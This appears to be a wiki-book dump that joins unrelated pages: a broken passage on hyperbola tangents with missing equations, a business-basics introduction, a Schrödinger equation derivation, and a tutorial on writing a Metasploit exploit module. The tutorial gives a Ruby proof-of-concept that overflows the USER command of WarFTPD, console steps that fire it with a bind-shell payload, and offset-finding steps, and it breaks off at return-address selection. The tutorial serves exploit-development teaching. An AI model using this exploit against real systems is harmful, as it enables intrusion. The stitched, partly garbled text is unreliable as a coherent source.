\frac{dy}{dx}               &amp; = \frac{b^2}{a^2}\times\frac{x}{y}
\end{align}&lt;/math&gt;
We can then substitute this into our point-gradient form, &lt;math&gt;y-y_1 = m(x-x_1)&lt;/math&gt;, using the point &lt;math&gt;P(x_1,y_1)&lt;/math&gt;:

:But we know that &lt;math&gt;\frac{x_1^2}{a^2}-\frac{y_1^2}{b^2} = 1&lt;/math&gt; from the definition of the hyperbola, so

The gradient of the normal is given by &lt;math&gt;-\frac{dx}{dy}&lt;/math&gt;, i.e., &lt;math&gt;-\frac{a^2}{b^2}\times\frac{y}{x}&lt;/math&gt;. Finding the equation,
:&lt;math&gt;\begin{align}
y-y_1 &amp; = -\frac{a^2}{b^2}\frac{y_1}{x_1}(x-x_1) \\
yb^2-y_1b^2 &amp; = -a^2\frac{y_1}{x_1}(x-x_1) \\
\frac{b^2y}{y_1}-b^2 &amp; = -\frac{a^2}{x_1}(x-x_1) \\
\frac{b^2y}{y_1}-b^2 &amp; = -\frac{a^2x}{x_1}+a^2 \\

      <text xml:space="preserve">So you want to start a business? Perhaps, you want to make money. Perhaps, you want to change the world. Perhaps, you don't want to work the &quot;typical&quot; job. This book will guide you through the process of starting and running your own business successfully.

==Introduction==
In economics, business is the social science of managing people to organize and maintain collective productivity toward accomplishing particular creative and productive goals, usually to generate profit.

=== Definition of business ===

The etymology of &quot;business&quot; refers to the state of being busy, in the context of the individual as well as the community or society. In other words, to be busy is to be doing commercially viable and profitable work.

The term &quot;business&quot; has at least three usages, depending on the scope — the general usage (above), the singular usage to refer to a particular company or corporation, and the generalized usage to refer to a particular market sector, such as &quot;the record business,&quot; &quot;the computer business,&quot; or &quot;the business community&quot; -- the community of suppliers of goods and services.

The singular &quot;business&quot; can be a legally-recognized entity within an economically free society, wherein individuals organize based on expertise and skills to bring about social and technological advancement.

In predominantly capitalist economies, businesses are typically formed to earn profit and grow the personal wealth of their owners. Notable exceptions to this rule include many cooperatives, non-profit organizations, and government institutions.

In other words, the owners and operators of a business have as one of their main objectives the receipt or generation of a financial return in exchange for their work — that is, the expense of time and energy — and for their acceptance of risk — investing work and money without certainty of success.


However, the exact definition of business is disputable, as is business philosophy; for example, most Marxists use &quot;means of production&quot; as a rough synonym for &quot;business.&quot; Socialists advocate either government, public, or worker ownership of most sizable businesses. Some advocate a mixed economy of private and state-owned enterprises. Others advocate a capitalist economy where all, or nearly all, enterprises are privately owned.

== Kinds of Business ==
;Sole Proprietorship: A business owned by one person. The owner may operate on their own or may employ others. The owner of the business has total and unlimited personal liability of the debts incurred by the business.

;Partnership: A partnership is a form of business in which two or more people operate for the common goal of making profit. Each partner has total and unlimited personal liability of the debts incurred by the partnership.

;Cooperative Business: (often referred to as a Co-Op business or Co-Ops) use a cooperative business structure: for-profit, limited liability, but with members of the co-op share decision-making authority. Co-Ops normally fall into three types: consumer co-ops, producer co-ops (common in agriculture) and worker-owned companies. Co-Ops are fundamental to the ideology of Economic democracy.

;Private Limited Company (Ltd): A small to medium sized business that is often run by the family or the small group who own it. The owners and managers are only liable for the business up to the amount they have invested in the company, and are not liable for the debts incurred by the company unless they have signed a personal guarantee.

;Public Limited Company: A business with limited liability, a wide spread of shareholders and in the UK, a share capital of over £50,000. The owners and managers are only liable for the business up to the amount they have invested in the company, and are not liable for the debts incurred by the company (unless they have signed a personal guarantee, which usually is not the case for a large corporation).

In the United States and some other countries, a limited company is known as either a corporation or a limited liability company, (LLC).

There are many types of businesses, and, as a result, businesses can be classified in many ways. One of the most common focuses on the primary profit-generating activities of a business, for example:

* Manufacturers produce products, from raw materials or component parts, which they then sell at a profit. Companies that make physical goods, such as cars or pipes, are considered manufacturers.
* Service businesses offer intangible goods or services and typically generate a profit by charging for labor or other services provided to government, other businesses or consumers. Organizations ranging from house decorators to consulting firms to restaurants and even to entertainers are types of service businesses.
* Retailers and Distributors act as middle-men in getting goods produced by manufacturers to the intended consumer, generating a profit as a result of providing sales or distribution services. Most consumer-oriented stores and catalogue companies are distributors or retailers.
* Agriculture and mining businesses are concerned with the production of raw material, such as plants or minerals.
* Financial businesses include banks and other companies that generate profit through investment and management of capital.
* Information businesses generate profits primarily from the resale of intellectual property and include movie studios, publishers and packaged software companies.
* Utilities produce public services, such as heat, electricity, or sewage treatment, and are usually government chartered.
* Real estate businesses generate profit from the selling, renting, and development of properties, homes, and buildings.
* Transportation businesses deliver goods and individuals from location to location, generating a profit on the transportation costs

There are many other divisions and subdivisions of businesses. The authoritative list of business types for North America (although it is widely used around the world) is generally considered to be the North American Industry Classification System, or NAICS.

;Unlimited Liability: A situation in which owners of a business are liable for all the debts that the business may incur.

;Limited Liability: A situation in which the liability of the owners of a business is limited to the full paid-up value of the share capital, (LLC).

== Functions of a business ==

Most businesses must accomplish similar functions regardless of size, legal structure or industry.  These functions are often organized into departments.  Common departments include (but are not limited to):
; Accountancy : typically responsible for financial reporting, financial controls and the raising of the capital necessary to run the business.
; Human Resources : typically responsible for hiring, firing, payroll, benefits, etc.
; Marketing and sales : responsible for selling the business' goods or services to the customer and for managing the relationships with the customer
::; Marketing : typically responsible for promoting interest in, and generating demand for, the business' products or services, and positioning them within the market
::; Sales : finding likely purchasers and obtaining their agreement (known as a contract) to buy the business' products or services
; Operations : makes the product or delivers the service
::; Production, costs, and pricing|Production : produces the raw materials into the delivered goods, if they require processing 
::; Customer service : supports customers who need help with the goods or services
; Procurement : responsible for acquiring the goods and services necessary for the business.  Sometimes organized as:
::; Strategic sourcing : determines the business' needs and plans for acquiring the necessary raw materials and services for the business
::; Purchasing : processes the purchase orders and related transactions
; Research and Development : tests to create new products and to determine their viability (e.g. pilot plants)
; Information Technology : manages the business' computer and data assets
; Communications/Public Relations : responsible for communicating to the outside world
; Administration : provides administrative support to the other departments (such as typing, filing, etc)
; Internal Audit : an independent control function typically accountable to the Board of Directors for reporting on the proper functioning of the other departments

Management is sometimes listed as a &quot;department&quot; but typically refers to the top level of leadership within the business regardless of their functional role.

== Legal forms of a business, and the advantages and disadvantages of each form ==

Most legal jurisdictions specify the forms that a business can take, and a body of commercial law has developed for each type. Some common types include partnerships, corporations (also called limited liability companies), and sole proprietorships.

The major factors affecting how a business is organized are usually:

* The size and scope of the business, and its anticipated management and ownership : A smaller business is more flexible, larger businesses or those with wider ownership or more formal structures, will usually tend to be organized as partnerships or (more commonly) corporations. In addition a business which wishes to raise money on a stock market or to be owned by a wide range of people will often be required to adopt a specific legal form to do so.
* The sector and country : private profit making businesses are different from government owned bodies. In some countries, certain businesses are legally obliged to be organized certain ways.
* Limited liability : corporations, and limited liability partnerships, protect their owners from business failure, and are treated as separate entities, whereas an unincorporated business or person working on their own is usually not so protected.
* Tax advantages : Different structures are treated differently in tax law, and may have advantages for this reason.
* Disclosure and compliance requirements : different business structures may be required to make more or less information public (or reported to relevant authorities), and may be bound to comply with different rules and regulations.

Many businesses are operated through a separate entity such as a corporation, limited partnership or limited liability company. Most legal jurisdictions allow people to organize such an entity by filing certain charter documents with the relevant Secretary of State or equivalent and complying with certain other ongoing obligations. The relationships and legal rights of shareholders, limited partners, or members, as the case may be, are governed partly by the charter documents and partly by the law of the jurisdiction where the entity is organized. Generally speaking, shareholders in a corporation, limited partners in a limited partnership, and members in a limited liability company are shielded from personal liability for the debts and obligations of the entity, which is legally treated as a separate &quot;person.&quot; This means that unless there is misconduct, the owner's own possessions are strongly protected in law, if the business does not succeed.

Where two or more individuals own a business together but have failed to organize a more specialized form of vehicle, they will be treated as a simple (USA: general) partnership. The terms of a partnership will be partly governed by a partnership agreement if one is created, and partly by the law of the jurisdiction where the partnership is located. No paperwork or filing is necessary to create a partnership, and without an agreement, the relationships and legal rights of the partners will be entirely governed by the law of the jurisdiction where the partnership is located.

A single person who owns and runs a business is commonly known as a sole proprietor, whether he or she owns it directly or through a formally organized entity.

A few relevant factors to consider in deciding how to operate a business include:

# General partners in a partnership (other than a limited liability partnership), plus anyone who personally owns and operates a business without creating a separate legal entity, are personally liable for the debts and obligations of the business.
# Generally, corporations are required to pay tax just like &quot;real&quot; people. In some tax systems, this can give rise to so-called double taxation, because first the corporation pays tax on the profit, and then when the corporation distributes its profits to its owners, individuals have to include dividends in their income when they complete their personal tax returns, at which point a second layer of income tax is imposed.
# In most countries, there are laws which treat small corporations differently than large ones. They may be exempt from certain legal filing requirements or labor laws, have simplified procedures in specialized areas, and have simplified, advantageous, or slightly different tax treatment.
# In order to &quot;go public&quot; (sometimes called IPO) -- which basically means to allow a part of the business to be owned by a wider range of investors or the public in general -- you must organize a separate entity, which is usually required to comply with a tighter set of laws and procedures. Most public entities are corporations that have sold shares, but increasingly there are also public LLCs that sell units (sometimes also called shares), and other more exotic entities as well (for example, REITs in the USA, Unit Trusts in the UK). However, you cannot take a general partnership &quot;public.&quot;

== Business laws and regulations ==

Most commercial transactions are governed by a very detailed and well-established body of rules that have evolved over a very long period of time, it being the case that governing trade and commerce was a strong driving force in the creation of law and courts in Western civilization.

As for other laws that regulate or impact businesses, in many countries it is all but impossible to chronicle them all in a single reference source. There are laws governing treatment of labor and generally relations with employees, safety and protection issues (OSHA or Health and Safety), anti-discrimination laws (age, gender, disabilities, race, and in some jurisdictions, sexual orientation), minimum wage laws, union laws, workers compensation laws, and annual vacation or working hours time.

In some specialized businesses, there may also be licenses required, either due to special laws that govern entry into certain trades, occupations or professions, which may require special education, or by local governments who just want your money. Professions that require special licenses run the gamut from law and medicine to flying airplanes to selling liquor to radio broadcasting to selling investment securities to selling used cars to roofing. Local jurisdictions may also require special licenses and taxes just to operate a business without regard to the type of business involved.

Some businesses are subject to ongoing special regulation. These industries include, for example, public utilities, investment securities, banking, insurance, broadcasting, aviation, and health care providers. Environmental regulations are also very complex and can impact many kinds of businesses in unexpected ways.

== Laws related to raising capital ==

When businesses need to raise money (called 'capital'), more laws come into play. A highly complex set of laws and regulations govern the offer and sale of investment securities (the means of raising money) in most Western countries. These regulations can require disclosure of a lot of specific financial and other information about the business and give buyers certain remedies. Because &quot;securities&quot; is a very broad term, most investment transactions will be potentially subject to these laws, unless a special exemption is available.

Capital may be raised through private means, by public offer (IPO) on a stock exchange, or in many other ways. Major stock exchanges include the New York Stock Exchange and Nasdaq (USA), the London Stock Exchange (UK), the Tokyo Stock Exchange (Japan), and so on. Most countries with capital markets have at least one.

Business that have gone &quot;public&quot; are subject to extremely detailed and complicated regulation about their internal governance (such as how executive officers' compensation is determined) and when and how information is disclosed to the public and their shareholders. In the United States, these regulations are primarily implemented and enforced by the United States Securities and Exchange Commission (SEC). Other Western nations have comparable regulatory bodies.

== Other business laws and regulations ==
As noted at the beginning, it is impossible to enumerate all of the types of laws and regulations that impact on business today. In fact, these laws have become so numerous and complex, that no business lawyer can learn them all, forcing increasing specialization among corporate attorneys. It is not unheard of for teams of 5 to 10 attorneys to be required to handle certain kinds of corporate transactions, due to the sprawling nature of modern regulation. Commercial law spans general corporate law, employment and labor law, healthcare law, securities law, M&amp;A law (who specialize in acquisitions), tax law, ERISA law (ERISA in the United States governs employee benefit plans), food and drug regulatory law, intellectual property law (specializing in copyrights, patents, trademarks and such), telecommunications law, and more.

Businesses often have important &quot;intellectual property&quot; that needs protection from competitors in order to stay profitable. This could require patents or copyrights or preservation of trade secrets. Most businesses have names, logos and similar branding techniques that could benefit from trademarking. Patents and copyrights in the United States are largely governed by federal law, while trade secrets and trademarking are mostly a matter of state law. Because of the nature of intellectual property, a business needs protection in every jurisdiction in which they are concerned about competitors. Many countries are signatories to international treaties concerning intellectual property.

== Management and ownership ==

The study of the efficient and effective operation of a business is called management. The main branches of management are financial management, marketing management, human resource management, strategic management, production management, service management, information technology management, and business intelligence.

Businesses can be bought and sold. Business owners often refer to their plan of disposing of the business as an &quot;exit plan.&quot; Common exit plans include IPOs, MBOs and mergers with other businesses.

&lt;/div&gt;

==Schrödinger at last==

The Schrödinger equation is non-relativistic. We obtain the non-relativistic version of the electromagnetic action differential,

:&lt;math&gt;
dS=-mc^2\,dt\sqrt{1-v^2/c^2}-qV(t,\mathbf{r})\,dt+(q/c) \mathbf{A}(t,\mathbf{r})\cdot d\mathbf{r},&lt;/math&gt;

by expanding the root and ignoring all but the first two terms:

:&lt;math&gt;
\sqrt{1-v^2/c^2}=1-{1\over2}{v^2\over c^2}-{1\over8}{v^4\over c^4}-\cdots\approx 1-{1\over2}{v^2\over c^2}.&lt;/math&gt;

This is obviously justified if &lt;math&gt;v\ll c,&lt;/math&gt; which defines the non-relativistic regime.

Writing the potential part of &lt;math&gt;dS&lt;/math&gt; as &lt;math&gt;q\,[-V+\mathbf{A}(t,\mathbf{r})\cdot (\mathbf{v}/c)]\,dt&lt;/math&gt; makes it clear that in most non-relativistic situations the effects represented by the vector potential&amp;nbsp;&lt;math&gt;\mathbf{A}&lt;/math&gt; are small compared to those represented by the scalar potential&amp;nbsp;&lt;math&gt;V.&lt;/math&gt; If we ignore them (or assume that &lt;math&gt;\mathbf{A}&lt;/math&gt; vanishes), and if we include the charge&amp;nbsp;&lt;math&gt;q&lt;/math&gt; in the definition of&amp;nbsp;&lt;math&gt;V&lt;/math&gt; (or assume that &lt;math&gt;q=1&lt;/math&gt;), we obtain

:&lt;math&gt;
S[\mathcal{C}]=-mc^2(t_B-t_A)+\int_\mathcal{C} dt\left[{\textstyle{m\over2}}v^2-V(t,\mathbf{r})\right]&lt;/math&gt;

for the action associated with a spacetime path&amp;nbsp;&lt;math&gt;\mathcal{C}.&lt;/math&gt;

Because the first term is the same for all paths from &lt;math&gt;A&lt;/math&gt; to&amp;nbsp;&lt;math&gt;B,&lt;/math&gt; it has no effect on the ''differences'' between the phases of the amplitudes associated with different paths. By dropping it we change neither the classical phenomena (inasmuch as the extremal path remains the same) nor the quantum phenomena (inasmuch as interference effects only depend on those differences). Thus

:&lt;math&gt;
\langle B|A\rangle=\int\mathcal{DC} e^{(i/\hbar)\int_\mathcal{C} dt[(m/2)v^2-V]}.&lt;/math&gt;

We now introduce the so-called ''wave function'' &lt;math&gt;\psi(t,\mathbf{r})&lt;/math&gt; as the ''amplitude'' of finding our particle at&amp;nbsp;&lt;math&gt;\mathbf{r}&lt;/math&gt; if the appropriate measurement is made at time&amp;nbsp;&lt;math&gt;t.&lt;/math&gt; &lt;math&gt;\langle t,\mathbf{r}|t',\mathbf{r}'\rangle\,\psi(t',\mathbf{r}'),&lt;/math&gt; accordingly, is the amplitude of finding the particle first at&amp;nbsp;&lt;math&gt;\mathbf{r}'&lt;/math&gt; (at time&amp;nbsp;&lt;math&gt;t'&lt;/math&gt;) and then at&amp;nbsp;&lt;math&gt;\mathbf{r}&lt;/math&gt; (at time&amp;nbsp;&lt;math&gt;t&lt;/math&gt;). Integrating over&amp;nbsp;&lt;math&gt;\mathbf{r},&lt;/math&gt; we obtain the amplitude of finding the particle at&amp;nbsp;&lt;math&gt;\mathbf{r}&lt;/math&gt; (at time&amp;nbsp;&lt;math&gt;t&lt;/math&gt;), provided that Rule&amp;nbsp;B applies. The wave function thus satisfies the equation

:&lt;math&gt;
\psi(t,\mathbf{r})=\int\!d^3r'\,\langle t,\mathbf{r}|t',\mathbf{r}'\rangle\,\psi(t',\mathbf{r}').&lt;/math&gt;

We again simplify our task by pretending that space is one-dimensional. We further assume that &lt;math&gt;t&lt;/math&gt; and&amp;nbsp;&lt;math&gt;t'&lt;/math&gt; differ by an infinitesimal interval&amp;nbsp;&lt;math&gt;\epsilon.&lt;/math&gt; Since &lt;math&gt;\epsilon&lt;/math&gt; is infinitesimal, there is only one path leading from &lt;math&gt;x'&lt;/math&gt; to&amp;nbsp;&lt;math&gt;x.&lt;/math&gt; We can therefore forget about the path integral except for a normalization factor&amp;nbsp;&lt;math&gt;\mathcal{A}&lt;/math&gt; implicit in the integration measure&amp;nbsp;&lt;math&gt;\mathcal{DC},&lt;/math&gt; and make the following substitutions:

:&lt;math&gt;
dt=\epsilon,\quad v=\frac{x-x'}{\epsilon},\quad V=V\left(t{+}\frac{\epsilon}{2},\frac{x{+}x'}{2}\right).&lt;/math&gt;

This gives us

:&lt;math&gt;
\psi(t{+}\epsilon,x)=\mathcal{A}\int\!dx'\,e^{im(x{-}x')^2/2\hbar\epsilon}\,
e^{-(i\epsilon/\hbar)V(t{+}\epsilon/2,(x{+}x')/2)}\,\psi(t,x').&lt;/math&gt;

We obtain a further simplification if we introduce &lt;math&gt;\eta=x'-x&lt;/math&gt; and integrate over &lt;math&gt;\eta&lt;/math&gt; instead of&amp;nbsp;&lt;math&gt;x'.&lt;/math&gt; (The integration &quot;boundaries&quot; &lt;math&gt;-\infty&lt;/math&gt; and &lt;math&gt;+\infty&lt;/math&gt; are the same for both &lt;math&gt;x'&lt;/math&gt; and &lt;math&gt;\eta.&lt;/math&gt;) We now have that

:&lt;math&gt;
\psi(t+\epsilon,x)=\mathcal{A}\int\!d\eta\,e^{im\eta^2/2\hbar\epsilon}\,
e^{-(i\epsilon/\hbar)V(t{+}\epsilon/2,x{+}\eta/2)}\,\psi(t,x{+}\eta).&lt;/math&gt;

Since we are interested in the limit &lt;math&gt;\epsilon\rightarrow0,&lt;/math&gt; we expand all terms to first order in&amp;nbsp;&lt;math&gt;\epsilon.&lt;/math&gt; To which power in &lt;math&gt;\eta&lt;/math&gt; should we expand? As &lt;math&gt;\eta&lt;/math&gt; increases, the phase &lt;math&gt;m\eta^2/2\hbar\epsilon&lt;/math&gt; increases at an infinite rate (in the limit &lt;math&gt;\epsilon\rightarrow0&lt;/math&gt;) unless &lt;math&gt;\eta^2&lt;/math&gt; is of the same order as&amp;nbsp;&lt;math&gt;\epsilon.&lt;/math&gt; In this limit, higher-order contributions to the integral cancel out. Thus the left-hand side expands to

:&lt;math&gt;
\psi(t+\epsilon,x)\approx\psi(t,x)+{\partial \psi\over\partial t}\epsilon,&lt;/math&gt;

while &lt;math&gt;e^{-(i\epsilon/\hbar)V(t{+}\epsilon/2,x{+}\eta/2)}\,\psi(t,x{+}\eta)&lt;/math&gt; expands to

:&lt;math&gt;
\left[1-{i\epsilon\over\hbar}V(t,x)\right]\left[\psi(t,x)+{\partial \psi\over\partial x}\eta+\frac12{\partial^2\psi\over\partial x^2}\eta^2\right]=
\left[1-{i\epsilon\over\hbar} V(t,x)\right]\!\psi(t,x)+{\partial \psi\over\partial x}\eta+ {\partial^2\psi\over\partial x^2}{\eta^2\over2}.&lt;/math&gt;

The following integrals need to be evaluated:

:&lt;math&gt;
I_1=\int\!d\eta\, e^{im\eta^2/2\hbar\epsilon},\quad
I_2=\int\!d\eta\, e^{im\eta^2/2\hbar\epsilon}\eta,\quad
I_3=\int\!d\eta\, e^{im\eta^2/2\hbar\epsilon}\eta^2.&lt;/math&gt;

The results are

:&lt;math&gt;
I_1=\sqrt{2\pi i\hbar\epsilon/m},\quad I_2=0,\quad I_3=\sqrt{2\pi\hbar^3\epsilon^3/im^3}.&lt;/math&gt;

Putting Humpty Dumpty back together again yields

:&lt;math&gt;
\psi(t,x)+{\partial \psi\over\partial t}\epsilon=\mathcal{A}\sqrt{2\pi i\hbar\epsilon\over m}
\left(1-{i\epsilon\over\hbar}V(t,x)\right)\psi(t,x)
+{\mathcal{A}\over2}\sqrt{2\pi\hbar^3\epsilon^3\over im^3}{\partial^2\psi\over\partial x^2}.&lt;/math&gt;

The factor of &lt;math&gt;\psi(t,x)&lt;/math&gt; must be the same on both sides, so &lt;math&gt;\mathcal{A}=\sqrt{m/2\pi i\hbar\epsilon},&lt;/math&gt; which reduces Humpty Dumpty to

:&lt;math&gt;
{\partial \psi\over\partial t}\epsilon=-{i\epsilon\over\hbar}V\psi+ {i\hbar\epsilon\over2m}{\partial^2\psi\over\partial x^2}.&lt;/math&gt;

Multiplying by &lt;math&gt;i\hbar/\epsilon&lt;/math&gt; and taking the limit &lt;math&gt;\epsilon\rightarrow0&lt;/math&gt; (which is trivial since &lt;math&gt;\epsilon&lt;/math&gt; has dropped out), we arrive at the Schrödinger equation for a particle with one degree of freedom subject to a potential&amp;nbsp;&lt;math&gt;V(t,x)&lt;/math&gt;:

:&lt;math&gt;
i\hbar{\partial \psi\over\partial t}=-{\hbar^2\over2m}{\partial^2\psi\over\partial x^2}+V\psi.&lt;/math&gt;

Trumpets please! The transition to three dimensions is straightforward:

{| style=&quot;border:5px solid lightsteelblue&quot; cellpadding=&quot;20px&quot;
|&lt;math&gt;i\hbar{\partial \psi\over\partial t}= -{\hbar^2\over2m}\left({\partial^2\psi\over\partial x^2}+ {\partial^2\psi\over\partial y^2}+{\partial^2\psi\over\partial z^2}\right)+V\psi.&lt;/math&gt;
|}

'''Writing a Windows Exploit for the Metasploit Framework'''

----

== Abstract ==

This page explains how to write a Windows Exploit for the Metasploit Framework v3.x.&lt;br&gt;
This page doesn't explain how to find vulnerabilities. (For this, please see Fuzzing)


== Overview ==

The Metasploit Framework helps to write reliable exploits easily and quickly.&lt;br&gt;
The Metasploit Framework uses the '''Ruby language'''.

== Requirements ==

'''Technical skills'''

* Some skills about the use of the Metasploit Framework.&lt;br&gt;
* Some programming skills ''(Ruby skills are useful but not fully required)''&lt;br&gt;
* Some understanding about the Windows memory management ''(Heap, Stack, Registers)''

'''Materials'''

* The Metasploit Framework installed and working&lt;br&gt;
* A Windows platform&lt;br&gt;
* A debugger [1]&lt;br&gt;
* A text editor


== Getting started ==

In the Metasploit Framework, an exploit is called an &quot;'''exploit module'''&quot;.&lt;br&gt;
&lt;br&gt;
Exploit modules are located by default in: &lt;br&gt;
C:\Program Files\Metasploit\Framework3\home\framework\modules\exploits\&lt;br&gt;
(also check C:\Documents and Settings\&lt;Your User Name&gt;\Application Data\msf3\modules\exploits if you do not find in above path)&lt;br&gt;
&lt;br&gt;
Exploit modules are classified by platforms (''OSes'') and then by types (''protocols'').&lt;br&gt;
&lt;br&gt;
=== Editing an exploit module ===
&lt;br&gt;
A good way to understand how an exploit module is written is to first edit one.&lt;br&gt;
&lt;br&gt;
We edit this module:&lt;br&gt;
C:\Program Files\Metasploit\Framework3\home\framework\modules\exploits\windows\ftp\cesarftp_mkd.rb&lt;br&gt;
&lt;br&gt;
&lt;font color=&quot;red&quot;&gt;#Notes of the author are noted in red.&lt;/font&gt;

=== Writing an exploit module ===

==== The target ====

To understand how to write an exploit module for the Metasploit Framework, we'll write an exploit for an easily exploitable vulnerability in WarFTPD version 1.5 [2].
&lt;br&gt;
''(Note that the exploit module for this vulnerability already exists in the Metasploit Framework, but we are trying to build our own exploit.)''
&lt;br&gt;
We download and install WarFTPD in our local Windows machine.
&lt;br&gt;
We start WarFTPD Daemon.
&lt;br&gt;
We uncheck the &quot;No anonymous logins&quot; checkbox.
&lt;br&gt;
We start the FTP server (click on the &quot;Go Online/Offline&quot; button)
&lt;br&gt;&lt;br&gt;

&lt;br&gt;&lt;br&gt;
Ok, the server is now waiting for us...

==== The vulnerability ====

The first thing to do is to find information about the vulnerability in question.  There are many possible sources for this.  
&lt;br&gt;
Here's an example:
&lt;br&gt;
http://osvdb.org/displayvuln.php?osvdb_id=875&amp;print
&lt;br&gt;
&lt;br&gt;
We now see that the bug can be triggered by sending ''a specially crafted request'' in the USER command.
&lt;br&gt;
Often a very long string will trigger this sort of bug, but let's verify that.

==== The PoC ====

We first reproduce the vulnerability.
&lt;br&gt;
For this, we directly use the Metasploit Framework.
&lt;br&gt;
We create the file:
&lt;br&gt;
C:\Program Files\Metasploit\Framework3\home\framework\modules\exploits\windows\ftp\warftpd.rb
&lt;br&gt;
&lt;br&gt;
We open this file and write (copy/paste) the following code in it:
 ##
 # This file is part of the Metasploit Framework and may be subject to 
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://Metasploit.com/projects/Framework/
 ##
 
 require 'msf/core'
  
 
 class Metasploit3 &lt; Msf::Exploit::Remote
  	Rank = AverageRanking
    
    #The names of the exploit module and the class are 'equal' 
 
 	include Msf::Exploit::Remote::Ftp
 
 	def initialize(info = {})
 		super(update_info(info,
 			'Name'           =&gt; 'War-FTPD 1.65 Username Overflow',
 			'Description'    =&gt; %q{
 				This module exploits a buffer overflow found in the USER command
 				of War-FTPD 1.65.
 			},	#End of Description
 			'Author'         =&gt; 'Your Name',	#Change this value with your (nick)name
 			'License'        =&gt; MSF_LICENSE,
 			'Version'        =&gt; '$Revision: 1 $',
 			'References'     =&gt; 
 				[
 					[ 'URL', 'http://osvdb.org/displayvuln.php?osvdb_id=875&amp;print' ]
 					#The URL mentioned above
 				],
 			'DefaultOptions' =&gt; 
 				{
 					'EXITFUNC' =&gt; 'process'
 				},
 			'Payload'        =&gt;
 				{
 					'Space'    =&gt; 1000,		#We actually don't know the correct value for this
 					'BadChars' =&gt; &quot;\x00&quot;
 					#We actually don't know the correct value for this
 				},
 			'Targets'        =&gt;
 				[
 					# Target 0
 					[
 						'Our Windows Target',
 						#Replace this with your Windows target platform (ie: Windows 2000 SP4)
 						{
 							'Platform' =&gt; 'win',	#We exploit a Windows target
 							'Ret'      =&gt; 0x01020304
 							#We actually don't know the correct value for this
 						}
 					]
 				]
 		)	#End of update_info()
 		)	#End of super()
 	end	#End of initialize
 
 	def exploit
 		connect
 
 		print_status(&quot;Trying target #{target.name}...&quot;)
 
 		exploit          = 'A' * 1000	#We first try to trigger the bug by sending a long string of 1000 &quot;A&quot;
 
 		send_cmd( ['USER', exploit] , false )	#We send our evil string
 
 		handler
 		disconnect	#We disconnect from the server 
 	end	#End of exploit
 
 end	#End of class


The WarFTPD server is running (listening on default port 21/tcp).
&lt;br&gt;
We now launch the Metasploit Framework's console.
&lt;br&gt;
''(Start / Programs / Metasploit3 / MSFConsole)''
&lt;br&gt;&lt;br&gt;
We can now view our exploit using this command:
&lt;br&gt;
show exploits
&lt;br&gt;
&lt;br&gt;
[[Image:Msf_book_warftpd_console00.png]]
&lt;br&gt;
&lt;br&gt;
We now launch our exploit using these commands:
&lt;br&gt;
use windows/ftp/warftpd&lt;br&gt;
set RHOST 127.0.0.1&lt;br&gt;
set TARGET 0&lt;br&gt;
set PAYLOAD generic/shell_bind_tcp&lt;br&gt;
exploit&lt;br&gt;
&lt;br&gt;
&lt;br&gt;
[[Image:Msf_book_warftpd_console01.png]]

After few seconds we see the WarFTPD Daemon FTP Server disappearing (crashing).
&lt;br&gt;
We have successfully reproduced the bug.


===== Debugging =====

To see what happens when the server crashes, we use a debugger.
&lt;br&gt;
We launch again WarFTPD Daemon and attach our debugger to it.
&lt;br&gt;
=&gt; In OllyDbg, we use &quot;File/Attach&quot;, choose the WarFTPD process, click Ok and after it has been loaded, we press the F9 key to have it Running.
&lt;br&gt;&lt;br&gt;


We launch our exploit again.
&lt;br&gt;
We can now look at our debugger.
&lt;br&gt;
We see that an access violation is triggered.
&lt;br&gt;
EIP is overwriten with our evil string (41414141 is the hexadecimal equivalent for AAAA)
&lt;br&gt;&lt;br&gt;

==== Fine tuning ====


===== Finding space available =====

We have to find the space available for our shellcode (payload).

The Metasploit Framework includes tools to help us.

First, we shut down our debugger.


We use the pattern_create() function to generate a string of non-repeating alpha-numeric text string.
We use this function by calling the following script:
C:\Program Files\Metasploit\Framework3\msf3\tools\pattern_create.rb

From a DOS command line console, it gives:

 C:\Program Files\Metasploit\Framework3\msf3\tools&gt;ruby pattern_create.rb
 Usage: pattern_create.rb length [set a] [set b] [set c]




We generate a string of 1000 characters and use it in our exploit to trigger the bug again:

 C:\Program Files\Metasploit\Framework3\framework\tools&gt;ruby pattern_create.rb 1000
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac

 Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh
 

In our PoC code, we replace this line:
 exploit          = 'A' * 1000

for:
 exploit          = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac

 Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh'


Then, we save our modified PoC code.
We start the War-FTPD FTP server.
We run our debugger and attach it to the War-FTPD process.
We launch our exploit...

Ok, we can now see this in our debugger:

[[Image:Msf_book_warftpd_olly02.png]]



We see that EIP is now overwritten with the value &quot;32714131&quot;.


Then we use patternOffset to know the number of characters to send before hitting EIP.
For this, we use the following script:
C:\Program Files\Metasploit\Framework3\framework\tools\pattern_offset.rb

From a DOS command line console, it gives:

 C:\Program Files\Metasploit\Framework3\msf3\tools&gt;ruby pattern_offset.rb
 Usage: pattern_offset.rb &lt;search item&gt; &lt;length of buffer&gt;
 Default length of buffer if none is inserted: 8192
 This buffer is generated by pattern_create() in the Rex library automatically


So, we now provide the parameters found before like this:
 C:\Program Files\Metasploit\Framework3\msf3\tools&gt;ruby pattern_offset.rb 32714131 1000&lt;br&gt;

The result &quot;485&quot; is displayed.
It means that we should have a space of 485 bytes to store our payload.


We add this value in our PoC code:
We modify this line:
 'Space'    =&gt; 1000,          #We actually don't know the correct value for this
for:
 'Space'    =&gt; 485,

In this way, when we will load our exploit in the Metasploit Framework (with the &quot;use&quot; command), it will automatically search and display the available payloads with a size lower than 485 (with the &quot;show PAYLOADS&quot; command).

===== Finding a return address =====

We have now to find a reliable return address.
&lt;br&gt;
The best way is to take a return address directly in our target. (in the vulnerable executable itself or in one of the DLLs it uses)&lt;br&gt;
It avoids problems with various versions of Windows and Service Packs, locales, hotfixes...&lt;br&gt;
It would make our exploit universal.&lt;br&gt;
But it is not always so easy.&lt;br&gt;
&lt;br&gt;
One way for this is to use the search in memory functionality of OllyDbg.&lt;br&gt;
